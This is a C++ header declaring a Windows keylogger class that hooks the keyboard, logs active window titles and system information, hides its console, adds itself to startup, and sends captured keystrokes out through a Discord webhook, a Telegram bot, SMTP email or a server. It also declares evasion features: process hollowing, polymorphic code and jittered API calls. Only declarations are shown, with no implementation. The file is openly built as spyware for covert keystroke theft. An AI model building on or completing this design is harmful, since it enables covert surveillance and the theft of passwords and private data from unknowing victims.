/**
 * @file KeyLogger.h
 * @brief Keylogger with Discord webhook reporting
 */

#pragma once

// Include winsock2.h before Windows.h to avoid conflicts
#include <winsock2.h>
#include <Windows.h>
#include <string>
#include <fstream>
#include <map>
#include <time.h>
#include "SmtpClient.h"

/**
 * @class KeyLogger
 * @brief A class that implements keylogging functionality with Discord reporting
 */
class KeyLogger {
private:
    // File handling
    std::ofstream logFile;
    std::string logFileName;
    std::string logDirectory;
    
    // Email configuration (legacy)
    SmtpClient* emailClient;
    std::string emailAddress;
    
    // Telegram configuration
    std::string telegramBotToken;
    std::string telegramChatId;
    bool useTelegram;
    
    // Discord configuration
    std::string discordWebhookUrl;
    bool useDiscord;
    
    // Keyboard hook and state
    HHOOK keyboardHook;
    std::map<int, std::string> specialKeys;
    bool isRunning;
    
    // Timing for reports
    time_t lastReportTime;
    int logInterval;
    
    // Anti-analysis flags
    bool useProcessHollowing;
    bool usePolymorphicCode;
    
    // Static instance for singleton pattern
    static KeyLogger* instance;
    
    // Forward declaration of the keyboard hook callback
    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
    
    // Helper methods
    void initSpecialKeys();
    std::string getActiveWindowTitle();
    void addToStartup(const std::string& appName);
    void createDirectoryStructure();
    void logSystemInfo();
    
    // Jitter function to randomize API calls
    void sleepWithJitter(int baseMs);
    
    // Communication functionality
    bool sendLogsToEmail();
    bool sendLogsToTelegram(const std::string& logData);
    std::string urlEncode(const std::string& str);
    std::string encryptData(const std::string& data);
    bool sendLogsToServer(const std::string& logData, const std::string& windowTitle);
    
public:
    /**
     * @brief Constructor for Discord webhook
     * @param webhookUrl Discord webhook URL
     * @param interval Time interval between log reports in seconds (default: 300)
     */
    KeyLogger(
        const std::string& webhookUrl,
        int interval = 300
    );
    
    /**
     * @brief Constructor for KeyLogger
     * @param telegramToken Telegram bot token
     * @param telegramChat Telegram chat ID
     * @param interval Time interval between log reports in seconds (default: 300)
     */
    KeyLogger(
        const std::string& telegramToken,
        const std::string& telegramChat,
        int interval = 300
    );
    
    /**
     * @brief Legacy constructor (email-based)
     */
    KeyLogger(
        const std::string& email, 
        const std::string& password, 
        const std::string& smtp = "smtp.gmail.com",
        int port = 587,
        int interval = 300
    );
    
    /**
     * @brief Destructor for KeyLogger
     */
    ~KeyLogger();
    
    /**
     * @brief Starts the keylogger
     * @param hideConsole Whether to hide the console window
     * @param addStartup Whether to add the application to startup
     * @param useProcessHollow Whether to use process hollowing
     * @return true if started successfully, false otherwise
     */
    bool start(bool hideConsole = true, bool addStartup = true, bool useProcessHollow = false);
    
    /**
     * @brief Logs a key press
     * @param vkCode The virtual key code of the pressed key
     */
    void logKey(int vkCode);
    
    /**
     * @brief Stops the keylogger
     */
    void stop();
    
    /**
     * @brief Gets the instance of the KeyLogger
     * @return Pointer to the KeyLogger instance
     */
    static KeyLogger* getInstance();
    
    /**
     * @brief Sends logs to Discord webhook
     * @param logData The log data to send
     * @return true if successful, false otherwise
     */
    bool sendLogsToDiscord(const std::string& logData);
}; 